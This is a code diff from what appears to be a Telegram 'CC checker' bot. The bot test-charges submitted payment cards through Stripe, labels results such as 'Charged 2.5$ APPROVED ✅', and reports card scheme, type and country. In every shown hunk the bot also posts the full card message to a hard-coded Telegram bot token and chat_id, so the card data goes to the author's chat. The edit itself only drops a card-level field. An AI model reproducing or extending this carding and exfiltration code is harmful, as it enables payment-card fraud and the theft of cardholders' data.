@@ -299,7 +299,7 @@ def snd_welcome ( message ) :
                         rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>\n'
                         rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe 3$</b>' + '\n'
                         status = '|- 𝐒𝐓𝐀𝐓𝐔𝐒: <b>INSUFFICIENT FUNDS ✅</b>\n'
-                        msg = '-𝘾𝘾 : ' + xx + status + rps + rp + shm + tp + lvel + cont + us + date + auther
+                        msg = '-𝘾𝘾 : ' + xx + status + rps + rp + shm + tp + cont + us + date + auther
                         bot.reply_to ( message , msg )
                         snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
                     else :
@@ -314,7 +314,7 @@ def snd_welcome ( message ) :
                         message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                     rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>✅\n'
                     rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe 3$</b>' + '\n'
-                    msg = '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp + lvel + cont + us + date + auther
+                    msg = '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp + cont + us + date + auther
                     bot.reply_to ( message , msg )
                     snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
                     requests.post ( snd )
@@ -353,7 +353,6 @@ def snd_welcome ( message ) :
                 '","' )[0]
             shm = '|-𝙨𝙘𝙝𝙚𝙢𝙚: ' + r.split ( '"scheme":"' )[1].split ( '","' )[0] + '\n'
             tp = '|- 𝙏𝙔𝙋𝙀: ' + r.split ( '"type":"' )[1].split ( '","' )[0] + '\n'
-            lvel = '|- 𝙇𝙀𝙑𝙀𝙇:' + r.split ( '"brand":"' )[1].split ( '","' )[0] + '\n'
             cont = '|- 𝘾𝙊𝙐𝙉𝙏𝙍𝙔: ' +r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '","' )[0] + '\t' + img + '\n'
             date = '|-𝘿𝘼𝙏𝙀: ' + str ( now ) + '\n'
             auther = '𝙗𝙤𝙩𝘽𝙮 : <a herf="https://t.me/n2k4n">𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣</a>'
@@ -405,7 +404,7 @@ def snd_welcome ( message ) :
                         rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>\n'
                         rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝙀𝙏:\t' + '<b>Stripe 2.5$</b>' + '\n'
                         status='|- 𝐒𝐓𝐀𝐓𝐔𝐒: <b>INSUFFICIENT FUNDS ✅</b>\n'
-                        msg= '-𝘾𝘾 : ' + xx +status+ rps + rp + shm + tp + lvel + cont + us + date + auther
+                        msg= '-𝘾𝘾 : ' + xx +status+ rps + rp + shm + tp  + cont + us + date + auther
                         bot.reply_to ( message , msg )
                         snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
                         requests.post(snd)
@@ -421,7 +420,7 @@ def snd_welcome ( message ) :
                         message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                     rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + "Charged 2.5$"+ '</b>\n'
                     rp = '|- 𝐒𝐓𝐀𝐓𝐔𝐒: <b>' + "APPROVED ✅"+ '</b>\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe 2.5$</b>' + '\n'
-                    msg= '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp + lvel + cont + us + date + auther
+                    msg= '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp  + cont + us + date + auther
                     bot.reply_to ( message , msg )
                     snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
                     requests.post ( snd )
@@ -430,7 +429,7 @@ def snd_welcome ( message ) :
                         message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                     rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' +"Charged 2.5$"+ '</b>\n'
                     rp = '|- 𝐒𝐓𝐀𝐓𝐔𝐒: <b>' + "APPROVED ✅"+ '</b>\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe 2.5$</b>' + '\n'
-                    msg= '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp + lvel + cont + us + date + auther
+                    msg= '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp  + cont + us + date + auther
                     bot.reply_to ( message , msg )
                     snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
                     requests.post ( snd )     
